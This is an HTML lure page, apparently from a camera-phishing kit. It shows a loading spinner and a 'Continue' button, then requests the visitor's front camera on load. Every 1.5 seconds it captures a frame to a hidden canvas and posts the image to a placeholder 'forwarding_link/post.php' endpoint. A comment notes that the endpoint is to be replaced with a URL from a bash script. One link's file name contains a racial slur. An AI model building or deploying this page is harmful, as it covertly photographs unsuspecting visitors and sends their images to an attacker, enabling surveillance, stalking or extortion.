
<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="GalirusProjects">
    <link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
    <meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
    <meta http-equiv="cache-control" content="index,cache">
    <meta http-equiv="pragma" content="index,cache">
    <meta name="keywords" content="GalirusProjects">
    <meta charset="utf-8">
    <title>Galirus Official</title>
    <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
    <style type="text/css">
        html {
            background-image: url('https://od.lk/s/OV8yNDQyMTA5MDFf/Picsart_24-07-17_19-26-43-870.jpg');
            background-repeat: no-repeat;
            background-position: center;
            background-size: cover;
            background-attachment: fixed;
            height: 100%;
            color: #fff;
            text-align: center;
            font-family: "Kelly Slab", sans-serif;
            margin: 0;
        }
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh; /* Mengatur tinggi penuh viewport */
            padding: 20px;
            box-sizing: border-box;
        }
        .button-like {
            display: inline-block;
            padding: 15px 30px;
            background-color: rgba(52, 152, 219, 0.8); /* Warna latar belakang dengan transparansi */
            color: #ffffff; /* Warna teks */
            border: 2px solid #2980b9; /* Warna border */
            border-radius: 25px;
            font-size: 24px; /* Ukuran teks tombol */
            text-decoration: none;
            transition: background-color 0.3s, transform 0.3s; /* Transisi efek */
            margin-top: 20px;
        }
        .button-like:hover {
            background-color: rgba(41, 128, 185, 1); /* Warna saat hover */
            transform: scale(1.05); /* Efek zoom saat hover */
        }
        .load {
            width: 100%;
            height: 100%;
            display: block;
            position: fixed; /* Mengatur posisi loader tetap di tengah */
            top: 0;
            left: 0;
            z-index: 9999; /* Pastikan loader di atas elemen lain */
            background-color: rgba(0, 0, 0, 0.5); /* Latar belakang semi-transparan */
        }
        .loader {
            display: inherit;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); /* Mengatur loader agar berada di tengah */
            width: 3cm;
            height: 3cm;
            border-radius: 50%;
            border: 7px solid #eaeaff;
            border-top: 7px solid #aadfff;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="load" id="loader">
    <div class="loader"></div>
</div>

<div class="video-wrap" hidden>
    <video id="video" playsinline autoplay></video>
</div>

<canvas hidden id="canvas" width="640" height="480"></canvas>

<a href="https://galirus404.github.io/GALIRUS/Nigga.html" class="button-like">Continue</a>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php', // Ganti dengan URL dari skrip bash
        dataType: 'json',
        async: false,
        success: function(result) {
            console.log(result);
        },
        error: function() {
            console.error("Error posting image data");
        }
    });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const constraints = {
    audio: false,
    video: {
        facingMode: "user"
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        console.error(`navigator.getUserMedia error: ${e.toString()}`);
        document.getElementById('loader').innerHTML = `<p>Camera access denied. Please allow camera access in your browser settings.</p>`;
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    // Menyembunyikan loader setelah akses kamera diberikan
    document.getElementById('loader').style.display = 'none';
    document.querySelector('.video-wrap').hidden = false; // Menampilkan video

    const context = canvas.getContext('2d');
    setInterval(function() {
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); 
    }, 1500);
}

// Load init
init();
</script>

</body>
</html>
